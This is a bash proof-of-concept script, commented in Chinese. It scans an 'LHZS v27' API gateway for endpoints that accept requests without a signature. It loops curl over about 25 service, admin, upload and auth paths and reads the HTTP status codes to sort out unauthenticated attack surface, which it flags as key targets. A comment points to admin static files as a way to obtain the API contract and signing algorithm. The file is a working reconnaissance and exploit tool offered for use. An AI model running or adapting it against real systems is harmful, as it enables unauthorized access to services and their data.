#!/usr/bin/env bash
# LHZS v27 网关：免签名接口定位 + 两层校验判据（改 GW 即可复用）
# 判据（本 POC 最值钱的部分）：
#   200                      -> 免签名放行（未授权面，重点目标）
#   400 INVALID_INPUT        -> 业务路径存在，但需要签名（签名校验层）
#   403 REQUEST_REJECTED     -> 管理面 / 未注册设备（前置拒绝层）
#   404 (nginx 146B)         -> 不在网关路由白名单（前缀不匹配）
#   404 (Tomcat/Spring)      -> 网关转发了，但后端无此资源
set -u
GW="${GW:-203.0.113.57}"
PATHS=(
  "/LHService/v27/routing/health" "/LHService/v27/routing/status" "/LHService/v27/routing/config"
  "/LHService/v27/routing/nodes" "/LHService/v27/routing/metrics" "/LHService/v27/routing/snapshot"
  "/Tk_Kj/v27/routing/health" "/IMService/v27/routing/health"
  "/LHService/v27/health" "/Tk_Kj/v27/health" "/IMService/v27/health"
  "/LHService/v27/public/query" "/Tk_Kj/v27/public/query" "/IMService/v27/chat/query"
  "/LHService/v27/auth/guest/start" "/LHService/v27/auth/register/start"
  "/LHService/v27/anti/postZdata" "/LHService/v27/anti/updateZdata"
  "/IMService/admin/" "/IMService/v27/admin/query" "/IMService/v27/admin/command"
  "/api/v1/mix/upload" "/api/v1/raw/upload" "/download/AutoUpdate" "/lhzs_download/temp.jpg"
)
echo "=== LHZS v27 网关免签名/两层校验判定 (GW=$GW) ==="
for P in "${PATHS[@]}"; do
  OUT=$(curl.exe --noproxy '*' -sk -m 10 -o - -w '|%{http_code}|%{size_download}' \
        -H 'X-Security-Version: 2' "https://$GW$P" 2>/dev/null)
  CODE=$(printf '%s' "$OUT" | sed -n 's/.*|\([0-9]\{3\}\)|.*/\1/p')
  BODY=$(printf '%s' "$OUT" | sed 's/|[0-9]\{3\}|[0-9]*$//')
  MARK=""
  case "$CODE" in
    200) MARK="  <<<< 免签名放行（未授权面）" ;;
    400) MARK="  (业务路径，需签名)" ;;
    403) MARK="  (管理面/未注册设备前置拒绝)" ;;
    404) MARK="  (不在网关路由白名单)" ;;
  esac
  printf '%-42s %s %s%s\n' "$P" "$CODE" "${BODY:0:80}" "$MARK"
done

# 管理后台静态资源（通常整目录未认证可读，直接拿 API 契约与签名算法）
# curl.exe --noproxy '*' -sk https://$GW/IMService/admin/api.js
# 注意：/IMService/ 会 302 到 /IMService/admin/，说明后台路径是约定固定的
curl.exe --noproxy '*' -sk -m 10 -D - -o /dev/null "https://$GW/IMService/" | grep -i location
